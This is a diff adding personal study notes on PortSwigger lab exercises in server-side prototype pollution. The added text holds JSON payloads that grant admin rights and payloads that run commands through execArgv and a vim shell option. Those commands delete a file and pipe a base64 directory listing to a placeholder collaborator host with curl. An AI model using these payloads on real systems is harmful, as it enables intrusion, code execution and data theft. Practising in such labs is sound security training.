@@ -329,5 +329,206 @@ Go back to the exploit server and deliver the exploit to the victim to solve the
 View exploit work than deliver to victim
 
 
-Privilege escalation via server-side prototype pollution
+**Privilege escalation via server-side prototype pollution**
+
+From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution> 
+
+Log in and submit form to change address 
+Request is returned in json 
+Identify a protype pollution source 
+
+Add a new __proto__ 
+
+```
+"__proto__": {
+    "foo":"bar"
+}
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f35a7cf1-25b6-4f56-b90c-3f9943b19d7e)
+
+Notice that the object in the response now includes the arbitrary property that you injected, but no **__proto__** property. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain. 
+
+
+
+
+
+Notice a isAdmin property set to false in first response. 
+
+
+
+Modify the request to try polluting the prototype with your own isAdmin property: 
+
+```
+"__proto__": {
+    "isAdmin":true
+}
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c2d9f6bb-eb8e-4bec-bb02-999c24c9e0d1)
+
+
+
+We are now admin
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/601cde2e-5cb7-4f31-adba-6cd95c8d9da5)
+
+
+
+**Detecting server-side prototype pollution without polluted property reflection**
+
+Entering our payload from last lab doesn't show any reflection but that doesn’t mean we don’t have prototype pollution
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/aa4e7521-71c7-43de-b5a0-2348114e384c)
+
+
+
+When we remove the comma to get an error it shoes that our foo is reflected
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3be8ba3b-2404-4596-9836-00cbe983dcb6)
+
+
+We also get a 500 error with a 400 status property 
+
+Fix the JSON syntax by reversing the changes that triggered the error. 
+Modify your injected property to try polluting the prototype with your own distinct status property. Remember that this must be between 400 and 599. 
+
+```
+"__proto__": {
+    "status":555
+}
+```
+
+Intentionally break the JSON syntax again and reissue the request. 
+Notice that this time, although you triggered the same error, the status and statusCode properties in the JSON response match the arbitrary error code that you injected into Object.prototype. This strongly suggests that you have successfully polluted the prototype and the lab is solved. 
+
+From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dd40f90e-d5f9-42b8-8eec-654dd4b83a8b)
+
+
+**Bypassing flawed input filters for server-side prototype pollution**
+
+From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution> 
+
+Sign in and notice that we get address change response in json like previous
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/89dba6cd-4346-4298-98ae-0ed4a97a4431)
+
+
+
+Identify a prototype pollution source
+
+In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property. 
+
+```
+"__proto__": {
+    "json spaces":10
+}
+```
+
+In the Response panel, switch to the Raw tab. Observe that the JSON indentation appears to be unaffected. 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f6969bc6-e5e4-4842-ab7f-baa2bf158b5d)
+
+
+
+Modify the request to try polluting the prototype via the constructor property instead: 
+Response panel, go to the Raw tab. This time, notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype. 
+
+```
+"constructor": {
+    "prototype": {
+        "json spaces":10
+    }
+}
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/34f3fce9-bd24-4a20-80c2-f576ed1d10b9)
+
+Identify a gadget
+Notice the isAdmin property, which is currently set to false. 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7581e476-67ea-49a5-9e25-b88386ed4802)
+
+Modify the request to try polluting the prototype with your own isAdmin property: 
+
+```
+"constructor": {
+    "prototype": {
+        "isAdmin":true
+    }
+}
+```
+We now have admin access
+
+**Remote code execution via server-side prototype pollution**
+
+Same as previous without constructor 
+```
+"__proto__": { "
+json spaces":10 
+}
+```
+
+
+
+
+
+Our exploit 
+
+To probe with collaborator server 
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+```
+
+
+To execute remote code execution 
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/717370a7-7815-4130-ad8a-ef69b5560772)
+
+
+• Go back to the admin panel and trigger the maintenance jobs again. Carlos's file is deleted and the lab is solved. 
+
+From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d0ba8b8a-4e4b-4ade-bed3-1cee6e9b35fd)
+
+**Exfiltrating sensitive data via server-side prototype pollution**
+
+From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution> 
+
+
+Require collaborator but the gist is the same
+
+Identify a prototype pollution source
+
+```
+"__proto__": {
+    "json spaces":10
+}
+```
+
+Probe for remote code execution
+
+```
+"__proto__": {
+    "shell":"vim",
+    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
+}
+```
+
+Leak the hidden file name
+```
+"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
+```
+
+• Notice that you have received a new HTTP POST request with a Base64-encoded body. 
+• Decode the contents of the body to reveal the names of two entries: node_apps and secret. 
+
+
+
+
 
